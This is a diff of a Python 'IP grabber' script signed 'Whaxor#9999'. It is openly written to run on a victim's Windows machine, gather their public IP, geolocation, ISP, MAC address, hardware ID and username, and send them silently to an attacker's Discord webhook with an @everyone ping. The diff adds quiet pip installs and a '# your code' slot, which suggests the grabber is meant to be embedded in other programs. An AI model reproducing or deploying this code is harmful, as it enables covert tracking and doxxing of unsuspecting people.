@@ -1,10 +1,22 @@
-import os.path
-import re, uuid, requests, socket, subprocess, time
-import sys
-from datetime import datetime
+import os
+try:
+    import re, uuid, requests, subprocess, os.path, sys, time
+    from datetime import datetime
+except:
+    os.system('pip install -q uiid')
+    os.system('pip install -q re')
+    os.system('pip install -q datetime')
+try:
+    import re, uuid, requests, subprocess, os.path, sys
+    from datetime import datetime
+except:
+    sys.exit()
 
+#config
+hook = "ENTER_WEBHOOK"
 victim = "VICTIM_NAME"
-webh = "ENTER_WEBHOOK"
+ping = "@everyone" #Leave blank for no ping
+
 
 """
                          ~:    .......     ::                              
@@ -40,7 +52,7 @@ webh = "ENTER_WEBHOOK"
               .:.                                                         
 """
 
-
+#grabber
 def grabber():
     if os.name != "nt":
         sys.exit()
@@ -54,24 +66,29 @@ def grabber():
         data = requests.get(f"http://ip-api.com/json/{ip}").json()
 
         # -------------------* hook *-------------------#
-        requests.post(webh, json={
-            "content": "None",
+        requests.post(hook, json={
+            "content": f"{ping}",
             "embeds": [
                 {
                     "title": f"{victim} | IP: {ip}",
                     "description": f"**Location**"
-                                       f"```python"
-                                           f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}"
-                                           f"Lat: {data['lat']} | Lon: {data['lon']} \nISP: {data['isp']}"
-                                           f"ORG: {data['org']}"
-                                           f"AS: {data['as']}"
-                                           f"MAC: {mac}"
-                                           f"HWID: {hwid}"
-                                           f"PC-USER: {pcname}```"
-                                           f"**Time Started:** "
-                                       f"```python"
-                                           f"{datetime.now().strftime('%H:%M:%S')}\n```",
-                    "color": 7419530,
+                                       f"```python\n"
+                                           f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}\n"
+                                           f"Lat: {data['lat']} | Lon: {data['lon']}\nISP: {data['isp']}"
+                                           f"ORG: {data['org']}\n"
+                                           f"AS: {data['as']}\n"
+                                           f"MAC: {mac}\n"
+                                           f"HWID: {hwid}\n"
+                                           f"PC-USER: {pcname}"
+                                   f"```"
+                                    f"**Execution time:** "
+                                        f"```python\n"
+                                            f"{round(time.time()-start, 2)} sec\n```"
+                                   
+                                    f"**Time Started:** "
+                                        f"```python\n"
+                                            f"{datetime.now()} \n```",
+                    "color": 5814783,
                     "footer": {
                         "text": "IP GRABBER BY Whaxor#9999",
                         "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
@@ -79,17 +96,19 @@ def grabber():
                     "timestamp": str(datetime.utcnow())
                 }
             ]
+
         }
     )
-    
+
     except:
         try:
-            requests.post(webh, json={"content": f"Failed to grab {victim}"})
+            requests.post(hook, json={"content": f"Failed to grab {victim}"})
         except:
             pass
 
-
+#start
 if __name__ == "__main__":
+    start = time.time()
     grabber()
-    
+
     # your code
